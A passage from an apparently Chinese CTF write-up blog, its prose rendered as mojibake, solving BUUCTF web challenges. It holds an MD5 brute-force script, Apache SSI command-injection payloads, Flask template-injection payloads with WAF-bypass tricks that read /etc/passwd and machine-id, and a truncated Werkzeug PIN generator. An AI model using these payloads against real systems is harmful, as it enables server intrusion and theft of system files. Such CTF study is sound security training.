</span></span><span class="line"><span class="cl">		<span class="nv">$random</span> <span class="o">=</span> <span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)]</span><span class="o">.</span><span class="nv">$chars</span><span class="p">[</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">73</span><span class="p">)];</span><span class="c1">//Random 5 times
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$content</span> <span class="o">=</span> <span class="nx">uniqid</span><span class="p">()</span><span class="o">.</span><span class="nv">$random</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Type: text/html;charset=utf-8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$admin</span> <span class="o">=</span> <span class="s1">&#39;6d0bc1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$admin</span> <span class="o">==</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]),</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_shtml</span> <span class="o">=</span> <span class="s2">&#34;public/&#34;</span><span class="o">.</span><span class="nx">get_hash</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;.shtml&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$shtml</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$file_shtml</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Unable to open file!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$text</span> <span class="o">=</span> <span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h1&gt;Hello,&#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">            ***
</span></span></span><span class="line"><span class="cl"><span class="s1">			***&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$shtml</span><span class="p">,</span><span class="nv">$text</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fclose</span><span class="p">(</span><span class="nv">$shtml</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">***</span>
</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="s2">&#34;[!] Header  error ...&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="o">***</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>passwordÁöÑmd5hashË¶ÅÊòØ6d0bc1,ÂÜôËÑöÊú¨ÁàÜÁ†¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="n">string</span><span class="o">=</span><span class="s1">&#39;0123456789&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">BF</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">left</span><span class="p">,</span><span class="n">right</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">left</span><span class="o">=</span><span class="n">left</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">right</span><span class="o">=</span><span class="n">right</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">admin</span><span class="o">=</span><span class="s1">&#39;6d0bc1&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">left</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">right</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">s</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span><span class="o">==</span><span class="n">admin</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">threads</span><span class="o">=</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">thread_count</span><span class="o">=</span><span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">thread_count</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">BF</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">2000000</span><span class="p">,(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">2000000</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2020666
2305004
9162671</p>
<p>ÁôªÂÖ•ÊàêÂäüÂêé‰ºöÂú®publicË∑ØÁî±‰∏ãÈù¢ÂÜôÂÖ•shtmlÊñá‰ª∂</p>
<p>Êé•‰∏ãÊù•Â∞±Áî®Âà∞</p>
<h3 id="apache-ssi-ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûssiÊ≥®ÂÖ•ÊºèÊ¥û">Apache SSI ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºàSSIÊ≥®ÂÖ•ÊºèÊ¥ûÔºâ
</h3><p>ÂΩìÁõÆÊ†áÊúçÂä°Âô®ÂºÄÂêØ‰∫ÜSSI‰∏éCGIÊîØÊåÅÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•‰∏ä‰º†shtmlÔºåÂà©Áî®<code>&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</code>ËØ≠Ê≥ïÊù•ÊâßË°åÂëΩ‰ª§„ÄÇ</p>
<p>‰ΩøÁî®SSI(Server Side Include)ÁöÑhtmlÊñá‰ª∂Êâ©Â±ïÂêçÔºåSSIÔºàServer Side Include)ÔºåÈÄöÂ∏∏Áß∞‰∏∫&quot;ÊúçÂä°Âô®Á´ØÂµåÂÖ•&quot;ÊàñËÄÖÂè´&quot;ÊúçÂä°Âô®Á´ØÂåÖÂê´&quot;ÔºåÊòØ‰∏ÄÁßçÁ±ª‰ºº‰∫éASPÁöÑÂü∫‰∫éÊúçÂä°Âô®ÁöÑÁΩëÈ°µÂà∂‰ΩúÊäÄÊúØ„ÄÇÈªòËÆ§Êâ©Â±ïÂêçÊòØ .stm„ÄÅ.shtm Âíå .shtml„ÄÇ</p>
<p>Êàë‰ª¨ÂÖàbpÊü•Áúã‰ø°ÊÅØÔºåÊâæÂà∞Ââç‰∏ãÁöÑshtmlÔºåÂõûÊòæÁî®Êà∑Âêç</p>
<p>ÂèØ‰ª•Âú®Áî®Êà∑ÂêçÂ§ÑÊ≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!--#exec cmd=&#34;ls ../&#34; --&gt;
</span></span><span class="line"><span class="cl">&lt;!--#exec cmd=&#34;cat /flag&#34; --&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÊâæÂà∞flag_990c66bf85a09c664f0b6741840499b2</p>
<h2 id="gyctf2020flaskapp">[GYCTF2020]FlaskApp
</h2><p>ÂÖàÁî®ÈùûÈ¢ÑÊúüËß£</p>
<p>Â≠óÁ¨¶‰∏≤ÊãºÊé•ÁªïËøáÔºåÊàñËÄÖÂÄíÂ∫èËæìÂá∫ÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Êü•Áúãapp.py
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span><span class="line"><span class="cl">ËøáÊª§‰∫ÜflagÂíåosÁ≠âÂáΩÊï∞ÂíåÂÖ≥ÈîÆËØç„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Â∞ÜÂ≠óÁ¨¶ÂÄíËΩ¨ËæìÂá∫
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht/&#39;[::-1],&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Â≠óÁ¨¶‰∏≤ÊãºÊé•
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == &#39;catch_warnings&#39; %}   {% for b in c.__init__.__globals__.values() %}   {% if b.__class__ == {}.__class__ %}     {% if &#39;eva&#39;+&#39;l&#39; in b.keys() %}       {{ b[&#39;eva&#39;+&#39;l&#39;](&#39;__impor&#39;+&#39;t__&#39;+&#39;(&#34;o&#39;+&#39;s&#34;)&#39;+&#39;.pope&#39;+&#39;n&#39;+&#39;(&#34;cat /this_is_the_fl&#39;+&#39;ag.txt&#34;).read()&#39;) }}     {% endif %}   {% endif %}   {% endfor %} {% endif %} {% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p>È¢ÑÊúüËß£</p>
<h3 id="pythonÁöÑflaskÊ®°ÊùøÊ≥®ÂÖ•debugÊ®°ÂºèÂà©Áî®pinÁ†ÅËøõË°årce">pythonÁöÑflaskÊ®°ÊùøÊ≥®ÂÖ•debugÊ®°ÂºèÂà©Áî®PINÁ†ÅËøõË°åRCE
</h3><p>ÁîüÊàêPINÁöÑÂÖ≥ÈîÆÂÄºÊúâÂ¶Ç‰∏ãÂá†‰∏™</p>
<p>1„ÄÅÊúçÂä°Âô®ËøêË°åflaskÊâÄÁôªÂΩïÁöÑÁî®Êà∑Âêç„ÄÇ ÈÄöËøáËØªÂèñ/etc/passwdËé∑Âæó
2„ÄÅmodname ‰∏ÄËà¨‰∏çÂèòÂ∞±ÊòØflask.app
3„ÄÅgetattr(app, ‚Äúname‚Äù, app.class.name)„ÄÇpythonËØ•ÂÄº‰∏ÄËà¨‰∏∫FlaskÂÄº‰∏ÄËà¨‰∏çÂèò
4„ÄÅflaskÂ∫ì‰∏ãapp.pyÁöÑÁªùÂØπË∑ØÂæÑ„ÄÇÈÄöËøáÊä•Èîô‰ø°ÊÅØÂ∞±‰ºöÊ≥ÑÈú≤ËØ•ÂÄº„ÄÇ
5„ÄÅÂΩìÂâçÁΩëÁªúÁöÑmacÂú∞ÂùÄÁöÑÂçÅËøõÂà∂Êï∞„ÄÇÈÄöËøáÊñá‰ª∂/sys/class/net/eth0/addressËé∑Âæó //eth0Â§Ñ‰∏∫ÂΩìÂâç‰ΩøÁî®ÁöÑÁΩëÂç°
6„ÄÅÊúÄÂêé‰∏Ä‰∏™Â∞±ÊòØÊú∫Âô®ÁöÑid„ÄÇ ÂØπ‰∫éÈùûdockerÊú∫ÊØè‰∏Ä‰∏™Êú∫Âô®ÈÉΩ‰ºöÊúâËá™Â∑≤ÂîØ‰∏ÄÁöÑidÔºålinuxÁöÑid‰∏ÄËà¨Â≠òÂú®/etc/machine-idÊàñ/proc/sys/kernel/random/boot_iÔºåÊúâÁöÑÁ≥ªÁªüÊ≤°ÊúâËøô‰∏§‰∏™Êñá‰ª∂ÔºåwindowsÁöÑidËé∑ÂèñË∑ülinux‰πü‰∏çÂêå„ÄÇÂØπ‰∫édockerÊú∫ÂàôËØªÂèñ/proc/self/cgroupÔºåÂÖ∂‰∏≠Á¨¨‰∏ÄË°åÁöÑ/docker/Â≠óÁ¨¶‰∏≤ÂêéÈù¢ÁöÑÂÜÖÂÆπ‰Ωú‰∏∫Êú∫Âô®ÁöÑid</p>
<p>‰∏ãÈù¢ÂºÄÂßãÊìç‰Ωú</p>
<p>ÈÄöËøáÈöè‰æøÊä•ÈîôÂõûÊòæapp.py‰ΩçÁΩÆ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221000830458.png"
	width="515"
	height="46"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221000830458_hu11095386175235880789.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250221000830458_hu1397321141671810404.png 1024w"
	loading="lazy"
	
		alt="image-20250221000830458"
	
	
		class="gallery-image" 
		data-flex-grow="1119"
		data-flex-basis="2686px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221000918781.png"
	width="1413"
	height="471"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221000918781_hu4385612776524818871.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250221000918781_hu8622763706439226603.png 1024w"
	loading="lazy"
	
		alt="image-20250221000918781"
	
	
		class="gallery-image" 
		data-flex-grow="300"
		data-flex-basis="720px"
	
></p>
<p>ÂèëÁé∞waf</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">**def waf(str): 
</span></span><span class="line"><span class="cl">	black_list =[&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]** 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ËØªÂèñÁî®Êà∑Âêç
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221001610926.png"
	width="1413"
	height="196"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250221001610926_hu10100283644761694589.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250221001610926_hu14703672434178222494.png 1024w"
	loading="lazy"
	
		alt="image-20250221001610926"
	
	
		class="gallery-image" 
		data-flex-grow="720"
		data-flex-basis="1730px"
	
></p>
<p>flaskweb</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ÂΩìÂâçÁΩëÁªúÁöÑmacÂú∞ÂùÄÁöÑÂçÅËøõÂà∂Êï∞„ÄÇ
</span></span><span class="line"><span class="cl"> {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/sys/class/net/eth0/address&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p>4e:4d:bc:b8:a0:2c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Â∞Ü4e4dbcb8a02cËΩ¨‰∏∫10ËøõÂà∂‰∏∫86095785664556
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ËØªÂèñÊú∫Âô®id
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc/self/cgroup&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p>docker-513f790d4e2fc09de7be4e6c769883760f1a8090aa089d9bba99b995084759ea.scope</p>
<p>‰ΩÜÊòØËøôÈ¢òÊòØbuuÁöÑË¶ÅËØªlinuxÁöÑmachine_id</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/machine-id&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><p>1408f836b0ca514d796cbf8960e45fa1</p>
<p>ÁîüÊàêpinÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
</span></span><span class="line"><span class="cl"><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flaskweb&#39;</span><span class="c1"># username</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;86095785664556&#39;</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;1408f836b0ca514d796cbf8960e45fa1&#39;</span><span class="c1"># get_machine_id(), /etc/machine-id</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
